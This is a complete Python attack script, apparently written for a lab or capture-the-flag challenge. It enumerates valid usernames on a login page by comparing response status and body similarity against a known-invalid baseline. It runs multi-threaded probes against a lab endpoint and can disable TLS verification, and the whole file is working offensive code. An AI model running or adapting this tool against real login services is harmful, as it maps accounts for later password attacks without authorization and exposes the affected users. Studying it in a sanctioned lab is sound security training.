#!/usr/bin/env python3
"""
enum_users.py - username enumeration against a login that leaks user existence.

Challenge "10 - Brute Force: Username Enumeration":
    "The Acme intranet login tells you whether a username exists before it
     checks the password."

Method: POST each candidate username with a dummy password. The response for a
NON-EXISTENT user is the baseline; any candidate whose response DIFFERS from
the baseline (status, length or body similarity) is a VALID username.

Usage:
    python3 enum_users.py --url http://10.15.1.54:9010/login \
        --users candidates.txt --threads 10

Options:
    --known-invalid  a username guaranteed not to exist (baseline). Default
                     "zzz_nonexistent_zzz_0000".
    --dummy-pass     password used for every probe (default "x").
    --threshold      body similarity below this = different (default 0.98).
"""
import argparse
import difflib
import ssl
import sys
import threading
import queue
import urllib.error
import urllib.parse
import urllib.request

_lock = threading.RLock()   # RLock: worker() holds it while calling log()


def log(m):
    with _lock:
        sys.stderr.write(m + "\n")
        sys.stderr.flush()


def probe(url, user_field, pass_field, username, password, timeout, insecure, extra):
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    data = {user_field: username, pass_field: password}
    for kv in (extra or []):
        if "=" in kv:
            k, v = kv.split("=", 1)
            data[k] = v
    payload = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(
        url, data=payload, method="POST",
        headers={"User-Agent": "Mozilla/5.0 (enum_users.py)",
                 "Content-Type": "application/x-www-form-urlencoded"},
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read().decode("utf-8", "replace")
            return r.getcode(), body
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERROR: %s" % e


def run(args):
    base_status, base_body = probe(
        args.url, args.user_field, args.pass_field, args.known_invalid,
        args.dummy_pass, args.timeout, args.insecure, args.extra)
    log("[*] baseline (invalid user %r): HTTP %s, %d bytes"
        % (args.known_invalid, base_status, len(base_body)))

    try:
        with open(args.users, "r", encoding="utf-8", errors="replace") as fh:
            users = [u.strip() for u in fh if u.strip()]
    except FileNotFoundError:
        log("[!] users file not found: %s" % args.users)
        return []

    q = queue.Queue()
    for u in users:
        q.put(u)
    hits = []

    def worker():
        while True:
            try:
                u = q.get_nowait()
            except queue.Empty:
                return
            st, body = probe(args.url, args.user_field, args.pass_field, u,
                             args.dummy_pass, args.timeout, args.insecure,
                             args.extra)
            ratio = difflib.SequenceMatcher(None, base_body, body).ratio()
            different = (st != base_status) or (ratio < args.threshold)
            if different:
                with _lock:
                    hits.append(u)
                    log("[+] VALID username: %-20s (HTTP %s, ratio=%.3f)"
                        % (u, st, ratio))

    threads = [threading.Thread(target=worker, daemon=True)
               for _ in range(args.threads)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    log("[*] done: %d candidates probed, %d valid found" % (len(users), len(hits)))
    return hits


def parse_args(argv):
    p = argparse.ArgumentParser(description="username enumeration")
    p.add_argument("--url", required=True, help="POST login endpoint")
    p.add_argument("--users", required=True, help="file with candidate usernames")
    p.add_argument("--user-field", default="username")
    p.add_argument("--pass-field", default="password")
    p.add_argument("--dummy-pass", default="x")
    p.add_argument("--known-invalid", default="zzz_nonexistent_zzz_0000")
    p.add_argument("--threshold", type=float, default=0.98)
    p.add_argument("--threads", type=int, default=10)
    p.add_argument("--timeout", type=float, default=10.0)
    p.add_argument("--extra", action="append", default=None)
    p.add_argument("--insecure", action="store_true")
    return p.parse_args(argv)


def main(argv=None):
    args = parse_args(argv if argv is not None else sys.argv[1:])
    hits = run(args)
    if hits:
        print("[+] valid usernames: " + ", ".join(hits))
        return 0
    print("[-] no valid usernames found")
    return 1


if __name__ == "__main__":
    sys.exit(main())
